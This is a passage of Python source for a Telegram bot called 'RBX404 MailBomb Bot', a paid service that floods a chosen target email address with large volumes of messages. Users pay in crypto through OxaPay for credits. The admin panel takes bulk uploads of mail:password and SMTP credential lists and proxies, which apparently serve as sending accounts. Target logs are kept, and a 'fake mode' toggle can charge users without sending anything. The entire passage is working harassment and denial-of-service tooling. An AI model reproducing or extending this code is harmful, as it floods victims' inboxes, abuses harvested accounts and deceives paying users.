💵 **Revenue:** ${total_revenue:.2f}

📧 **SMTP:** {smtp_active}/{smtp_total} (💚 {smtp_healthy})
🌐 **Proxies:** {proxy_active}/{proxy_total}
💰 **Packages:** {packages_active}
🎟️ **Coupons:** {coupons_active}
"""
            
            keyboard = [
                [InlineKeyboardButton("🔄 Toggle Bomb", callback_data="admin_toggle_bomb"),
                 InlineKeyboardButton("💣 Set Min", callback_data="admin_set_min")],
                [InlineKeyboardButton("📧 SMTP", callback_data="admin_smtp"),
                 InlineKeyboardButton("🌐 Proxies", callback_data="admin_proxies")],
                [InlineKeyboardButton("💰 Packages", callback_data="admin_packages"),
                 InlineKeyboardButton("🎟️ Coupons", callback_data="admin_coupons")],
                [InlineKeyboardButton("👥 Users", callback_data="admin_users"),
                 InlineKeyboardButton("📊 Logs", callback_data="admin_logs")],
                [InlineKeyboardButton("💳 Payments", callback_data="admin_payments")],
                [InlineKeyboardButton("🔙 Back", callback_data="start")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # SET MIN BOMB
    elif data == "admin_set_min":
        if user_id not in ADMIN_IDS:
            return
        user_sessions[user_id] = {"step": "set_min_bomb"}
        await safe_edit("💣 **Set Minimum Bomb Amount**\n\nSend a number:", None)
        return
    
    # SMTP PANEL
    elif data == "admin_smtp":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            accounts = db.query(SmtpAccount).all()
            
            text = f"📧 **SMTP Accounts** ({len(accounts)} total)\n\n"
            
            for acc in accounts[:15]:
                status = "✅" if acc.is_active else "❌"
                health = "💚" if acc.health_status == "healthy" else "❤️" if acc.health_status == "dead" else "⚪"
                auth = "⚡" if acc.auth_type == "app_password" else "🔑" if acc.auth_type == "password" else "📧"
                
                text += f"{status}{health}{auth} **{acc.email}**\n"
                text += f"   Sent: {acc.total_sent} | Failed: {acc.total_failed}\n"
            
            if len(accounts) > 15:
                text += f"\n... and {len(accounts) - 15} more"
            
            keyboard = [
                [InlineKeyboardButton("📤 Upload mail:pass", callback_data="upload_password")],
                [InlineKeyboardButton("📤 Upload mail:app", callback_data="upload_app")],
                [InlineKeyboardButton("📤 Upload SMTP", callback_data="upload_smtp")],
                [InlineKeyboardButton("🔍 Health Check", callback_data="admin_health")],
                [InlineKeyboardButton("🗑️ Delete Dead", callback_data="admin_delete_dead")],
                [InlineKeyboardButton("🔙 Admin", callback_data="admin")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # UPLOAD PASSWORD FORMAT
    elif data == "upload_password":
        if user_id not in ADMIN_IDS:
            return
        user_sessions[user_id] = {"upload_type": "password"}
        await safe_edit("""
📤 **Upload: mail:pass**

Send TXT file with format:
```

email1@gmail.com:password1
email2@outlook.com:password2

```

Accounts will be VALIDATED before adding!
""", None)
        return
    
    # UPLOAD APP PASSWORD
    elif data == "upload_app":
        if user_id not in ADMIN_IDS:
            return
        user_sessions[user_id] = {"upload_type": "app_password"}
        await safe_edit("""
📤 **Upload: mail:app_password**

Send TXT file with format:
```

email1@gmail.com:app_password1
email2@outlook.com:app_password2

```

⚡ **These are FASTER and more reliable!**
Accounts will be VALIDATED before adding!
""", None)
        return
    
    # UPLOAD SMTP FORMAT
    elif data == "upload_smtp":
        if user_id not in ADMIN_IDS:
            return
        user_sessions[user_id] = {"upload_type": "smtp"}
        await safe_edit("""
📤 **Upload: SMTP Format**

Send TXT file with format:
```

smtp.server.com:587:email@domain.com:password
smtp.gmail.com:587:test@gmail.com:pass123

```

Accounts will be VALIDATED before adding!
""", None)
        return
    
    # HEALTH CHECK
    elif data == "admin_health":
        if user_id not in ADMIN_IDS:
            return
        
        await safe_edit("🔍 **Running health check...**\n\nThis may take a minute...", None)
        
        db = SessionLocal()
        try:
            accounts = db.query(SmtpAccount).filter(SmtpAccount.is_active == True).all()
            
            results = {"healthy": 0, "dead": 0, "total": len(accounts)}
            
            for acc in accounts:
                is_healthy, error = await validate_smtp_account(acc.email, acc.password, acc.auth_type)
                acc.last_health_check = datetime.now(timezone.utc)
                
                if is_healthy:
                    acc.health_status = "healthy"
                    acc.consecutive_fails = 0
                    results["healthy"] += 1
                else:
                    acc.health_status = "dead"
                    acc.consecutive_fails += 1
                    results["dead"] += 1
                    if acc.consecutive_fails >= 3:
                        acc.is_active = False
                
                db.commit()
            
            text = f"""
✅ **Health Check Complete!**

💚 Healthy: {results['healthy']}
❤️ Dead: {results['dead']}
Total: {results['total']}
"""
            
            keyboard = [
                [InlineKeyboardButton("🗑️ Delete Dead", callback_data="admin_delete_dead")],
                [InlineKeyboardButton("🔙 SMTP", callback_data="admin_smtp")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # DELETE DEAD ACCOUNTS
    elif data == "admin_delete_dead":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            dead = db.query(SmtpAccount).filter(SmtpAccount.health_status == "dead").all()
            count = len(dead)
            for acc in dead:
                db.delete(acc)
            db.commit()
            
            await query.answer(f"🗑️ Deleted {count} dead accounts!", show_alert=True)
            
            # Reload SMTP panel - duplicate code to avoid query.data modification
            accounts = db.query(SmtpAccount).all()
            
            text = f"📧 **SMTP Accounts** ({len(accounts)} total)\n\n"
            
            for acc in accounts[:15]:
                status = "✅" if acc.is_active else "❌"
                health = "💚" if acc.health_status == "healthy" else "❤️" if acc.health_status == "dead" else "⚪"
                auth = "⚡" if acc.auth_type == "app_password" else "🔑" if acc.auth_type == "password" else "📧"
                
                text += f"{status}{health}{auth} **{acc.email}**\n"
                text += f"   Sent: {acc.total_sent} | Failed: {acc.total_failed}\n"
            
            if len(accounts) > 15:
                text += f"\n... and {len(accounts) - 15} more"
            
            keyboard = [
                [InlineKeyboardButton("📤 Upload mail:pass", callback_data="upload_password")],
                [InlineKeyboardButton("📤 Upload mail:app", callback_data="upload_app")],
                [InlineKeyboardButton("📤 Upload SMTP", callback_data="upload_smtp")],
                [InlineKeyboardButton("🔍 Health Check", callback_data="admin_health")],
                [InlineKeyboardButton("🗑️ Delete Dead", callback_data="admin_delete_dead")],
                [InlineKeyboardButton("🔙 Admin", callback_data="admin")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # PROXIES
    elif data == "admin_proxies":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            proxies = db.query(Proxy).all()
            
            text = f"🌐 **Proxies** ({len(proxies)} total)\n\n"
            
            for p in proxies[:15]:
                status = "✅" if p.is_active else "❌"
                text += f"{status} {p.proxy_string}\n"
            
            if len(proxies) > 15:
                text += f"\n... and {len(proxies) - 15} more"
            
            keyboard = [
                [InlineKeyboardButton("📤 Upload Proxies", callback_data="upload_proxy")],
                [InlineKeyboardButton("🔙 Admin", callback_data="admin")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # UPLOAD PROXY
    elif data == "upload_proxy":
        if user_id not in ADMIN_IDS:
            return
        user_sessions[user_id] = {"upload_type": "proxy"}
        await safe_edit("""
📤 **Upload Proxies**

Send TXT file with format:
```

http://123.45.67.89:8080
socks5://98.76.54.32:1080
http://user:pass@proxy.com:8080

```

Proxies will be VALIDATED before adding!
""", None)
        return
    
    # PACKAGES
    elif data == "admin_packages":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            packages = db.query(CreditPackage).all()
            
            text = "💰 **Packages**\n\n"
            
            for pkg in packages:
                status = "✅" if pkg.is_active else "❌"
                stock = f"{pkg.stock - pkg.sold_count}/{pkg.stock}" if pkg.stock else "∞"
                text += f"{status} **{pkg.name}**\n"
                text += f"   {pkg.credits} credits - ${pkg.price_usd:.2f}\n"
                text += f"   Stock: {stock} | Sold: {pkg.sold_count}\n\n"
            
            keyboard = [
                [InlineKeyboardButton("➕ Create (use /createpackage)", callback_data="admin_packages")],
                [InlineKeyboardButton("🔙 Admin", callback_data="admin")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # COUPONS
    elif data == "admin_coupons":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            coupons = db.query(Coupon).order_by(Coupon.created_at.desc()).limit(20).all()
            
            text = "🎟️ **Coupons**\n\n"
            
            for c in coupons:
                status = "✅" if c.is_active else "❌"
                max_uses = f"/{c.max_uses}" if c.max_uses else ""
                text += f"{status} **{c.code}**\n"
                text += f"   {c.credits} credits | Uses: {c.uses}{max_uses}\n"
            
            keyboard = [
                [InlineKeyboardButton("➕ Create (use /createcoupon)", callback_data="admin_coupons")],
                [InlineKeyboardButton("🔙 Admin", callback_data="admin")]
            ]
            
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # USERS
    elif data == "admin_users":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            users = db.query(User).order_by(User.created_at.desc()).limit(15).all()
            
            text = "👥 **Users**\n\n"
            
            for u in users:
                text += f"**{u.tg_id}**\n"
                text += f"   Credits: {u.credits} | Sent: {u.total_emails_sent}\n"
                text += f"   Spent: ${u.total_spent:.2f}\n"
            
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]]
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # LOGS
    elif data == "admin_logs":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            logs = db.query(BombLog).order_by(BombLog.created_at.desc()).limit(15).all()
            
            text = "📊 **Recent Bombs**\n\n"
            
            for log in logs:
                text += f"**{log.target_email}**\n"
                text += f"   User: {log.user_tg_id}\n"
                text += f"   Sent: {log.successful_count}/{log.requested_count}\n"
            
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]]
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return
    
    # PAYMENTS
    elif data == "admin_payments":
        if user_id not in ADMIN_IDS:
            return
        
        db = SessionLocal()
        try:
            payments = db.query(Payment).order_by(Payment.created_at.desc()).limit(15).all()
            
            text = "💳 **Payments**\n\n"
            
            for p in payments:
                status_emoji = "✅" if p.status == "paid" else "⏳" if p.status == "pending" else "❌"
                text += f"{status_emoji} **${p.amount_usd:.2f}**\n"
                text += f"   User: {p.user_tg_id}\n"
                text += f"   Status: {p.status}\n"
            
            keyboard = [[InlineKeyboardButton("🔙 Admin", callback_data="admin")]]
            await safe_edit(text, InlineKeyboardMarkup(keyboard))
        finally:
            db.close()
        return


    # ========== PURCHASE FLOW (unchanged) ==========
    
    elif data.startswith("buy_"):
        package_id = int(data.split("_")[1])
        
        db = SessionLocal()
        try:
            pkg = db.query(CreditPackage).filter(CreditPackage.id == package_id).first()
            if not pkg or not pkg.is_active:
                await query.answer("❌ Package not available!", show_alert=True)
                return
            
            if pkg.stock is not None:
                remaining = pkg.stock - pkg.sold_count
                if remaining <= 0:
                    await query.answer("❌ OUT OF STOCK!", show_alert=True)
                    return
            
            await query.answer("💳 Creating payment...")
            
            # Create OxaPay invoice
            invoice_data = {
                "merchant": OXAPAY_API_KEY,
                "amount": pkg.price_usd,
                "currency": "USD",
                "lifeTime": 30,
                "feePaidByPayer": 0,
                "underPaidCover": 2,
                "description": f"{pkg.name} - {pkg.credits} credits"
            }
            
            try:
                response = requests.post("https://api.oxapay.com/merchants/request", json=invoice_data, timeout=10)
                invoice = response.json()
                
                if invoice.get("result") == 100:
                    payment_link = invoice["payLink"]
                    track_id = invoice["trackId"]
                    
                    # Save payment
                    payment = Payment(
                        user_tg_id=user_id,
                        package_id=pkg.id,
                        amount_usd=pkg.price_usd,
                        credits=pkg.credits,
                        track_id=track_id,
                        payment_url=payment_link,
                        status="pending"
                    )
                    db.add(payment)
                    db.commit()
                    
                    text = f"""
💳 **Payment Created!**

Package: **{pkg.name}**
Credits: **{pkg.credits}**
Price: **${pkg.price_usd:.2f}**

Track ID: `{track_id}`

👇 **Click to Pay with Crypto:**
"""
                    
                    keyboard = [
                        [InlineKeyboardButton("💳 Pay Now", url=payment_link)],
                        [InlineKeyboardButton("🔙 Back", callback_data="purchase")]
                    ]
                    
                    await safe_edit(text, InlineKeyboardMarkup(keyboard))
                else:
                    await safe_edit("❌ **Payment Failed**\n\nCouldn't create invoice. Try again!", 
                                  InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="purchase")]]))
            
            except Exception as e:
                logger.error(f"OxaPay error: {e}")
                await safe_edit("❌ **Payment Failed**\n\nError creating payment. Try again!", 
                              InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="purchase")]]))
        
        finally:
            db.close()
        return
    
    # BOMB CONFIRM
    elif data == "bomb_confirm":
        if user_id not in user_sessions or user_sessions[user_id].get("step") != "confirm":
            await query.answer("❌ Session expired!", show_alert=True)
            return
        
        session = user_sessions[user_id]
        target = session.get("email")
        count = session.get("count")
        subject = session.get("subject")
        message = session.get("message")
        
        await query.answer("💣 Bombing started...")
        await safe_edit("⏳ **Bombing in progress...**\n\nThis may take a few moments...", None)
        
        # Execute bomb
        result = await bomb_email(user_id, target, count, subject, message)
        
        if result["success"]:
            success_rate = int(result['sent']/result['total']*100) if result['total'] > 0 else 0
            text = f"""
✅ **Bomb Complete!**

Target: `{target}`
Sent: **{result['sent']}/{result['total']}**
Failed: {result['failed']}

Success Rate: {success_rate}%
"""
        else:
            text = f"""
❌ **Bomb Failed!**

Error: {result.get('error', 'Unknown error')}
"""
        
        keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="start")]]
        await safe_edit(text, InlineKeyboardMarkup(keyboard))
        
        user_sessions.pop(user_id, None)
        return

# Wrapper function
async def button_callback_wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extract query from update and call main handler"""
    query = update.callback_query
    await button_callback(query, context)


# ========== REFERRAL INFO FROM QUERY ==========
async def referral_info_cmd_from_query(query, context):
    """Show referral info from callback query"""
    user_id = query.from_user.id
    bot_username = (await context.bot.get_me()).username
    
    db = SessionLocal()
    try:
        user = get_user(db, user_id)
        
        verified_count = db.query(Referral).filter(
            Referral.referrer_id == user_id,
            Referral.status == "verified"
        ).count()
        
        referral_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
        
        text = f"""
🔗 **Referral System**

Your referral link:
`{referral_link}`

📊 **Your Stats:**
- Total Referred: {user.referral_count}
- Verified Referrals: {verified_count}
- Credits Earned: {user.referral_count * 5}

💡 **How it works:**
1. Share your referral link with friends.
2. When they join via your link, they'll be asked to join our channel & group.
3. Once they join both, you receive **5 credits** automatically!

📢 Channel: {CHANNEL_USERNAME or 'Not set'}
👥 Group: {GROUP_USERNAME or 'Not set'}
"""
        await query.edit_message_text(text, parse_mode='Markdown')
    finally:
        db.close()


# ========== COMMAND HANDLERS ==========

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with referral handling"""
    # Handle referral if present
    await handle_referral_start(update, context)
    
    # Then show main menu
    user_id = update.effective_user.id
    
    db = SessionLocal()
    try:
        user = get_user(db, user_id, update.effective_user.username, update.effective_user.first_name)
        is_admin = user_id in ADMIN_IDS
        
        text = f"""
🌧️ **RBX404 MailBomb Bot**

💰 Credits: **{user.credits}**
📧 Sent: **{user.total_emails_sent}**
💵 Spent: **${user.total_spent:.2f}**
"""
        
        keyboard = [
            [InlineKeyboardButton("💣 Email Bomb", callback_data="bomb")],
            [InlineKeyboardButton("🛒 Buy Credits", callback_data="purchase"),
             InlineKeyboardButton("💰 Balance", callback_data="balance")],
            [InlineKeyboardButton("🎟️ Redeem", callback_data="redeem"),
             InlineKeyboardButton("📊 History", callback_data="my_history")],
            [InlineKeyboardButton("❓ Help", callback_data="help")],
            [InlineKeyboardButton("🔗 Referral", callback_data="referral_info")]
        ]
        
        if is_admin:
            keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
        
        logo = get_bot_logo()
        
        if logo:
            try:
                await update.message.reply_photo(
                    photo=logo,
                    caption=text,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
                return
            except:
                pass
        
        await update.message.reply_text(
            text=text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    finally:
        db.close()

async def setlogo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set bot logo - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /setlogo <telegram_file_id>\n\nSend a photo to get its file_id!")
        return
    
    file_id = " ".join(context.args)
    
    db = SessionLocal()
    try:
        set_setting(db, "bot_logo_file_id", file_id)
        await update.message.reply_text(f"✅ **Logo Updated!**\n\nFile ID: `{file_id[:50]}...`", parse_mode='Markdown')
    finally:
        db.close()

async def togglebomb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Toggle bomb mode - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    db = SessionLocal()
    try:
        current = get_setting(db, "real_bombing", "true").lower()
        new_value = "false" if current == "true" else "true"
        set_setting(db, "real_bombing", new_value)
        
        status = "✅ REAL BOMBING ENABLED" if new_value == "true" else "❌ FAKE MODE ENABLED"
        await update.message.reply_text(status)
    finally:
        db.close()

async def setminbomb_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set minimum bomb amount - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) < 1:
        db = SessionLocal()
        try:
            current = int(get_setting(db, "min_bomb_amount", "100"))
            await update.message.reply_text(f"Current: **{current}**\n\nUsage: /setminbomb <amount>", parse_mode='Markdown')
        finally:
            db.close()
        return
    
    try:
        amount = int(context.args[0])
        
        if amount < 1:
            await update.message.reply_text("❌ Minimum must be >= 1!")
            return
        
        db = SessionLocal()
        try:
            set_setting(db, "min_bomb_amount", str(amount))
            await update.message.reply_text(f"✅ **Minimum Bomb Amount:** {amount}", parse_mode='Markdown')
        finally:
            db.close()
    except ValueError:
        await update.message.reply_text("❌ Invalid number!")

async def createpackage_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create package - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) < 3:
        await update.message.reply_text("""
Usage: /createpackage <name> <credits> <price> [stock] [description]

Example:
`/createpackage Starter 1000 10.00 50 Perfect for beginners`

Stock: Optional (leave empty for unlimited)
Description: Optional
""", parse_mode='Markdown')
        return
    
    try:
        name = context.args[0]
        credits = int(context.args[1])
        price = float(context.args[2])
        stock = int(context.args[3]) if len(context.args) > 3 and context.args[3].isdigit() else None
        description = " ".join(context.args[4:]) if len(context.args) > 4 else None
        
        db = SessionLocal()
        try:
            pkg = CreditPackage(
                name=name,
                credits=credits,
                price_usd=price,
                stock=stock,
                description=description
            )
            db.add(pkg)
            db.commit()
            
            await update.message.reply_text(f"""
✅ **Package Created!**

Name: **{name}**
Credits: {credits}
Price: ${price:.2f}
Stock: {stock if stock else '∞'}
""", parse_mode='Markdown')
        finally:
            db.close()
    
    except ValueError:
        await update.message.reply_text("❌ Invalid format!")

async def createcoupon_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create coupon - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("""
Usage: /createcoupon <code> <credits> [max_uses]

Example:
`/createcoupon WELCOME100 100 50`

Max uses: Optional (leave empty for unlimited)
""", parse_mode='Markdown')
        return
    
    try:
        code = context.args[0].upper()
        credits = int(context.args[1])
        max_uses = int(context.args[2]) if len(context.args) > 2 else None
        
        db = SessionLocal()
        try:
            # Check if code exists
            existing = db.query(Coupon).filter(Coupon.code == code).first()
            if existing:
                await update.message.reply_text(f"❌ Code **{code}** already exists!", parse_mode='Markdown')
                return
            
            coupon = Coupon(
                code=code,
                credits=credits,
                max_uses=max_uses,
                created_by=update.effective_user.id
            )
            db.add(coupon)
            db.commit()
            
            await update.message.reply_text(f"""
✅ **Coupon Created!**

Code: **{code}**
Credits: {credits}
Max Uses: {max_uses if max_uses else '∞'}
""", parse_mode='Markdown')
        finally:
            db.close()
    
    except ValueError:
        await update.message.reply_text("❌ Invalid format!")

async def checkpayment_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check payment status via OxaPay API - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /checkpayment <track_id>")
        return
    
    track_id = context.args[0]
    
    db = SessionLocal()
    try:
        # Find payment
        payment = db.query(Payment).filter(Payment.track_id == track_id).first()
        
        if not payment:
            await update.message.reply_text("❌ Payment not found!")
            return
        
        # Check status with OxaPay
        try:
            response = requests.post(
                "https://api.oxapay.com/merchants/inquiry",
                json={
                    "merchant": OXAPAY_API_KEY,
                    "trackId": track_id
                },
                timeout=10
            )
            result = response.json()
            
            if result.get("result") == 100:
                status = result.get("status")
                
                # Update payment
                if status == "Paid" and payment.status != "paid":
                    payment.status = "paid"
                    payment.completed_at = datetime.now(timezone.utc)
                    
                    # Add credits to user
                    user = get_user(db, payment.user_tg_id)
                    user.credits += payment.credits
                    user.total_spent += payment.amount_usd
                    
                    # Update package sold count
                    if payment.package_id:
                        pkg = db.query(CreditPackage).filter(CreditPackage.id == payment.package_id).first()
                        if pkg:
                            pkg.sold_count += 1
                    
                    db.commit()
                    
                    # Notify user
                    try:
                        await context.bot.send_message(
                            chat_id=payment.user_tg_id,
                            text=f"""
✅ **Payment Received!**

Credits Added: **{payment.credits}**
New Balance: **{user.credits}**

Thank you for your purchase!
"""
                        )
                    except:
                        pass
                    
                    await update.message.reply_text(f"""
✅ **Payment Confirmed!**

Track ID: `{track_id}`
User: {payment.user_tg_id}
Credits Added: {payment.credits}
Status: PAID
""", parse_mode='Markdown')
                else:
                    await update.message.reply_text(f"""
💳 **Payment Status**

Track ID: `{track_id}`
User: {payment.user_tg_id}
Amount: ${payment.amount_usd}
Status: **{status}**
""", parse_mode='Markdown')
            else:
                await update.message.reply_text(f"❌ OxaPay API Error: {result.get('message', 'Unknown error')}")
        
        except Exception as e:
            await update.message.reply_text(f"❌ Error checking payment: {str(e)}")
    
    finally:
        db.close()

async def addcredits_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add credits to user - admin only"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("""
Usage: /addcredits <user_id> <amount>

Example:
`/addcredits 123456789 1000`
""", parse_mode='Markdown')
        return
    
    try:
        user_tg_id = int(context.args[0])
        amount = int(context.args[1])
        
        if amount < 1:
            await update.message.reply_text("❌ Amount must be positive!")
            return
        
        db = SessionLocal()
        try:
            user = get_user(db, user_tg_id)
            user.credits += amount
            db.commit()
            
            await update.message.reply_text(f"""
✅ **Credits Added!**

User: {user_tg_id}
Added: +{amount}
New Balance: {user.credits}
""", parse_mode='Markdown')
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=user_tg_id,
                    text=f"""
🎁 **Credits Added!**

You received: **{amount} credits**
New Balance: **{user.credits}**
"""
                )
            except:
                pass
        
        finally:
            db.close()
    
    except ValueError:
        await update.message.reply_text("❌ Invalid format!")


# ========== MESSAGE HANDLERS (unchanged) ==========

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    step = session.get("step")
    
    db = SessionLocal()
    try:
        # BOMB FLOW
        if step == "email":
            # Validate email
            if not is_valid_email(text):
                await update.message.reply_text("❌ Invalid email! Try again:")
                return
            
            session["email"] = text
            session["step"] = "count"
            
            min_bomb = int(get_setting(db, "min_bomb_amount", "100"))
            
            await update.message.reply_text(f"💣 **How many emails?**\n\nMinimum: {min_bomb}")
            return
        
        elif step == "count":
            try:
                count = int(text)
                min_bomb = int(get_setting(db, "min_bomb_amount", "100"))
                
                if count < min_bomb:
                    await update.message.reply_text(f"❌ Minimum is {min_bomb}! Try again:")
                    return
                
                user = get_user(db, user_id)
                if count > user.credits:
                    await update.message.reply_text(f"❌ Insufficient credits!\n\nYou have: {user.credits}\nNeed: {count}")
                    return
                
                session["count"] = count
                session["step"] = "subject"
                
                await update.message.reply_text("📧 **Email subject:**")
                return
            
            except ValueError:
                await update.message.reply_text("❌ Invalid number! Try again:")
                return
        
        elif step == "subject":
            session["subject"] = text
            session["step"] = "message"
            
            await update.message.reply_text("💬 **Email message (HTML supported):**")
            return
        
        elif step == "message":
            session["message"] = text
            session["step"] = "confirm"
            
            confirm_text = f"""
📋 **Confirm Bomb:**

Target: `{session['email']}`
Count: **{session['count']}**
Subject: {session['subject']}

Cost: **{session['count']} credits**

Ready to send?
"""
            
            keyboard = [
                [InlineKeyboardButton("✅ Confirm & Send", callback_data="bomb_confirm")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
            ]
            
            await update.message.reply_text(confirm_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            return
        
        # COUPON REDEMPTION
        elif step == "coupon":
            code = text.upper()
            
            coupon = db.query(Coupon).filter(Coupon.code == code, Coupon.is_active == True).first()
            
            if not coupon:
                await update.message.reply_text("❌ Invalid or expired coupon!")
                user_sessions.pop(user_id, None)
                return
            
            if coupon.max_uses and coupon.uses >= coupon.max_uses:
                await update.message.reply_text("❌ Coupon has reached max uses!")
                user_sessions.pop(user_id, None)
                return
            
            user = get_user(db, user_id)
            user.credits += coupon.credits
            coupon.uses += 1
            db.commit()
            
            await update.message.reply_text(f"""
✅ **Coupon Redeemed!**

Code: **{code}**
Credits Added: **{coupon.credits}**

New Balance: **{user.credits}**
""", parse_mode='Markdown')
            
            user_sessions.pop(user_id, None)
            return
        
        # ADMIN: SET MIN BOMB
        elif step == "set_min_bomb":
            try:
                amount = int(text)
                
                if amount < 1:
                    await update.message.reply_text("❌ Minimum must be >= 1!")
                    return
                
                set_setting(db, "min_bomb_amount", str(amount))
                await update.message.reply_text(f"✅ **Minimum Bomb Amount:** {amount}", parse_mode='Markdown')
                
                user_sessions.pop(user_id, None)
                return
            
            except ValueError:
                await update.message.reply_text("❌ Invalid number!")
                return
    
    finally:
        db.close()

async def photo_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle photo uploads - admin only"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    photo = update.message.photo[-1]
    file_id = photo.file_id
    
    await update.message.reply_text(f"""
📸 **Photo File ID:**

`{file_id}`

**Tap to copy** ☝️

**Admin: Set this as bot start image?**

Use: `/setlogo {file_id}`
""", parse_mode='Markdown')

async def document_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads with VALIDATION"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if user_id not in user_sessions:
        return
    
    session = user_sessions[user_id]
    upload_type = session.get("upload_type")
    
    if not upload_type:
        return
    
    # Download file
    file = await context.bot.get_file(update.message.document.file_id)
    file_path = f"temp_{secrets.token_hex(4)}.txt"
    await file.download_to_drive(file_path)
    
    db = SessionLocal()
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
        
        os.remove(file_path)
        
        # SMTP UPLOAD WITH VALIDATION
        if upload_type in ["password", "app_password", "smtp"]:
            await update.message.reply_text(f"🔍 **Validating {len(lines)} accounts...**\n\nThis may take a minute...")
            
            added = 0
            failed = 0
            errors = []
            
            for line in lines:
                try:
                    if upload_type == "smtp":
                        # Format: smtp.server.com:587:email:password
                        parts = line.split(":")
                        if len(parts) != 4:
                            failed += 1
                            errors.append(f"Invalid format: {line[:50]}")
                            continue
                        
                        smtp_server, smtp_port, email, password = parts
                        smtp_port = int(smtp_port)
                    else:
                        # Format: email:password
                        parts = line.split(":")
                        if len(parts) != 2:
                            failed += 1
                            errors.append(f"Invalid format: {line[:50]}")
                            continue
                        
                        email, password = parts
                        smtp_server, smtp_port = get_smtp_server(email)
                    
                    # Validate email
                    if not is_valid_email(email):
                        failed += 1
                        errors.append(f"Invalid email: {email}")
                        continue
                    
                    # Check if already exists
                    existing = db.query(SmtpAccount).filter(SmtpAccount.email == email).first()
                    if existing:
                        failed += 1
                        errors.append(f"Duplicate: {email}")
                        continue
                    
                    # VALIDATE ACCOUNT
                    is_valid, error_msg = await validate_smtp_account(email, password, upload_type)
                    
                    if not is_valid:
                        failed += 1
                        errors.append(f"{email}: {error_msg}")
                        continue
                    
                    # Add account
                    account = SmtpAccount(
                        email=email,
                        password=password,
                        auth_type=upload_type,
                        smtp_server=smtp_server,
                        smtp_port=smtp_port,
                        health_status="healthy"
                    )
                    db.add(account)
                    added += 1
                
                except Exception as e:
                    failed += 1
                    errors.append(f"Error: {str(e)[:50]}")
                    continue
            
            db.commit()
            
            result_text = f"""
✅ **Upload Complete!**

✅ Added: {added}
❌ Failed: {failed}

All accounts were VALIDATED!
"""
            
            if errors and len(errors) <= 10:
                result_text += "\n**Errors:**\n"
                for err in errors[:10]:
                    result_text += f"• {err}\n"
            
            await update.message.reply_text(result_text)
            user_sessions.pop(user_id, None)
            return
        
        # PROXY UPLOAD WITH VALIDATION
